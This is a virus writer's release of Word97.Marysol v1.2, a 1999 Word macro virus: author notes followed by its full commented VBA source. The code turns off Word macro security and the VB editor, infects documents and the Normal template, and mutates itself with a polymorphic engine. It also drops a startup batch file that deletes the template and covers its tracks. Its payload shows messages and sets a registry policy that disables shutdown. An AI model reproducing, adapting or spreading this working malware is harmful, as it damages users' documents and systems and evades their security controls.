-------------------------------------------------------------------------------------------------

	Name:	Word97.Marysol v1.2	[AVP: Word97.Mary.A]
      Author:	cry0tek
      Origin:   Philippines
	Type:   Class object infector
      Target:	Microsoft Word 8.0/9.0 Documents
    Finished:   December 20, 1999
     Payload:   Yes - displays messages and disables shutdown

    Features:	
		Stealth
		Polymorphic code
		Removes read-only attribute in Normal.dot if set

       Notes:
		This is my first class virus.  It is Word97/2k compatible, and it uses standard
		stealth methods.

		The virus infects documents and the normal template.  It executes the 
		polymorphic engine only if normal.dot is not yet infected.  I did it to make the
		generation of polymorphic code somewhat slow, and to speed up the infection of
		documents.  Executing the engine every time the virus infects is definitely
		a waste of time.

		If the read-only attribute of normal.dot is set, the virus bypasses the infection
		routine and it will try to remove the read-only attribute by dropping a batch
		file.  It will place it in "c:\windows\start menu\programs\startup" so that it 
		will be executed on every startup.

		The polymorphic engine is a modified verison of VAMP by VicodinES.  I have 
		modified the way it generates random characters by increasing the variability
		of the characters generated.  The engine works by searching for some some 
		strings inside the code and replaces it with a "randomized" version.  The string 
		generated will be a combination of uppercase, lowercase and numbers.  The 
		string's length is 30 charactes maximum, that is 3 chars * 10 reps.

		The payload activates if today's date is equal to minutes.  After that it will
		execute the corresponding routine depending on the date and if a random value
		will be equals to 1.  The payload routine can display a text message on the 
		statusbar or through the Office Assistant or it will tweak the registry and
		disable shutting down Win9x systems.  That may be annoying to newbies.

		The commented source code follows.

-------------------------------------------------------------------------------------------------


'Word97.MarySol v1.2
'(c) 1999 cry0tek

Private Sub Document_Open()	' This will be Document_Close() in normal.dot
'MarySol
On Error Resume Next
	' Our error handler
Dim varray(1 to 14) As String
	' Define array for the polymorphic engine
Dim var1 As Long: Dim var2 As Long: Dim var3 As Long: Dim var4 As Long
	' Define vars for the polymorphic engine
If Left(Application.Version, 1) > 9 Then
	' If application version is greater than 9.0, then it is Microsoft Word 2000
	' Our stealth routine should be different
 CommandBars("Macro").Controls("Security...").Delete
	' Remove commandbar for macro security settings
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
	' Allow existence of our macros
Else
 Options.VirusProtection = (1 - 1)
	' Probably a lower version of Microsoft Word, use the old stealth method
End If
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
	' Disable ALT+F11
Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (1 - 1): Application.EnableCancelKey = (1 - 1)
Application.ScreenUpdating = (1 - 1): Application.ShowVisualBasicEditor = (1 - 1)
	' Disable some options, setting Application.ShowVisualBasicEditor to false closes
	' the VB Editor
If System.OperatingSystem = "Windows" And System.LanguageDesignation = "English (United States)" Then
	' Check if OS is Windows :(
 NormalAttrib = GetAttr(NormalTemplate.FullName)
	' Get the file attribute of normal template
 If NormalAttrib = vbReadOnly Then GoTo AttrCheck
 If NormalAttrib = vbReadOnly + vbArchive Then GoTo AttrCheck
	' If readonly/archive then drop a batch file that will remove the file attribute
End If
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).Codemodule
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).Codemodule
	' Set some values
If AD.Lines(5, 1) <> "'MarySol" Then
	' Check if our marker exists on line 5
	' If not then lets infect the document
 AD.DeleteLines 1, _ 
 AD.CountOfLines
	' Delete other code, if ever there is
	' Maybe other macro viruses are inside the document
 AD.InsertLines 1, NT.Lines _
 (1, NT.CountOfLines)
	' Let's inset our code into the document
 AD.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
	' Replace line 4 with Private Sub Document_Open()
End If
If NT.Lines(5, 1) <> "'MarySol" Then
	' Check if our marker exists on line 5
	' If not then lets infect the normal template
 Randomize
 varray(1) = "NormalAttrib" : varray(2) = "AD" : varray(3) = "NT" : varray(4) = "var1" : varray(5) = "var2" : varray(6) = "var3" : varray(7) = "var4"
 varray(8) = "AttrCheck" : varray(9) = "NFile" : varray(10) = "Cmd" : varray(11) = "Path1" : varray(12) = "Path2" : varray(13) = "DelCmd": varray(14) = "SFile"
	' Values for the array, these are the strings we need to modify with random characters
 For i = 1 to 14
  For j = 1 to Int((10 * Rnd) + 1)
	' Number of repetitions
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
	' Generate random string
  Next j
  With AD
	' We only mutate if we are in activedocument
   var1 = 1: var2 = 1: var3 = .CountOfLines: var4 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), var1, var2, var3, var4, True) 
	' Search the active module for the specified string
	' Syntax:
	'  .Find(target, startline, startcol, endline, endcol [, wholeword] [, matchcase] [, patternsearch]) As Boolean
    strVal = .Lines(var1, 1)
    strVal = Left(strVal, var2 - 1) & PolyVal & Mid(strVal, var4)
    .ReplaceLine var1, strVal
    var1 = var3 + 1: var2 = 1
    var3 = .CountOfLines: var4 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
	' Reset value
 Next i
 NT.DeleteLines 1, _
 NT.CountOfLines
	' Delete other macros
 NT.InsertLines 1, AD.Lines _ 
 (1, AD.CountOfLines)
	' Insert our code inside the normal template
 NT.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
	' after infecting the normal template, replace line 4 
	' with Private Sub Document_Close()
	' We can eliminate this one, but this is how I chose to do things so that we will infect on open/close
End If
If NT.CountOfLines <> 0 And AD.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
	' If normal template is already infected and the document is not then
	' lets ask the user to save the document. 
If Day(Now) = Minute(Now) Then 
	' Our payload
 Select Case Day(Now)
  Case 3 And Int((15 * Rnd) + 1) = 1
   Application.StatusBar = "Word97.MarySol v1.2"
	' Show the text in the statusbar
  Case 12 And Int((30 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Word97.MarySol v1.2"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
	' Show the Office Assistant with a custom message
   End With
  Case 21 And Int((45 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
	' Lets disable Shutdown by tweaking with the registry
 End Select
End If
Exit Sub
AttrCheck:
NFile = NormalTemplate
	' Get the filename of our normal template
SFile = "c:\windows\startm~1\programs\startup\msexec.bat"
	' This is the batch file that will automatically be executed when Windows starts
	' We can store this in several locations:
	'  HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	'  win.ini 
	'  autoexec.bat
	' But I chose to store it here since we will be deleting the batch file after execution.
	' We don't want to tweak with the reg values/autoexec. This makes our life much easier :)
Cmd = "attrib -h -r "
	' Our command to disable the hidden and read-only attribute of a file
Path1 = "c:\progra~1\micros~1\templa~1\"
Path2 = "c:\progra~1\micros~2\templa~1\"
	' Possible paths for MsOffice templates
DelCmd = "del "
	' The delete command :)
Open SFile For Append Access Write As #1
	' Lets create the batch file
Print #1, vbCr + vbLf + "@echo off"
Print #1, Cmd + Path1 + NFile
Print #1, Cmd + Path2 + NFile
	' Concatenate the attrib command with the path and the normal template filename
	' Make sure that the attribute of normal.dot is cleared before we delete it
Print #1, DelCmd + Path1 + NFile
Print #1, DelCmd + Path2 + NFile
	' Concatenate the del command with the path and the normal template filename
Print #1, "cls"
	' Clear screen
Print #1, DelCmd + SFile 
	' Then lets delete the batch file to leave no traces of what we have done
Close 1
	' Close the opened file
End Sub


-------------------------------------------------------------------------------------------------

